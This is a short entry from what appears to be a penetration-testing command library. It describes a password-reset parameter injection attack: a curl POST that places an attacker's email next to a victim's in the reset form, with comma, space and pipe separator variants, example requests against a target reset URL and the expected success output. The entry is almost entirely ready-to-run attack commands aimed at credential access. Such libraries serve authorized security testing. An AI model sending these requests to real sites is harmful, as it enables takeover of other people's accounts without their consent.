---
id: 582b6063-a691-45bb-96f2-a02efaee605b
name: curl-post-password-reset-separator-injection
type: command
executor: bash
data: 'curl -X POST -d "email=$_VICTIM_EMAIL,$_ATTACKER_EMAIL" $_TARGET_URL'
output: null
created_at: '2023-04-06T03:55:53.810690+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - parameter-manipulation
  - credential-access
  - injection
verified: true
validated: true
---

# curl-post-password-reset-separator-injection

## Command

```bash
curl -X POST -d "email=$_VICTIM_EMAIL,$_ATTACKER_EMAIL" $_TARGET_URL
```

## Description

Uses separators like commas, spaces, or pipes in the email parameter to split and process multiple addresses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Endpoint URL | Yes |
| $_VICTIM_EMAIL | Victim email | Yes |
| $_ATTACKER_EMAIL | Attacker email | Yes |

## Examples

### Comma Separator

```bash
curl -X POST -d "email=victim@example.com,attacker@example.com" https://target.com/reset
```

### Space Separator

```bash
curl -X POST -d "email=victim@example.com%20attacker@example.com" https://target.com/reset
```

### Pipe Separator

```bash
curl -X POST -d "email=victim@example.com|attacker@example.com" https://target.com/reset
```

## Expected Output

```
{"success": true}
```
Multiple reset emails sent if separator is parsed.

## Related

- [[procedures/Exploit-Password-Reset-via-Email-Parameter-Manipulation]]
- [[commands/curl-post-password-reset-cc-injection]]
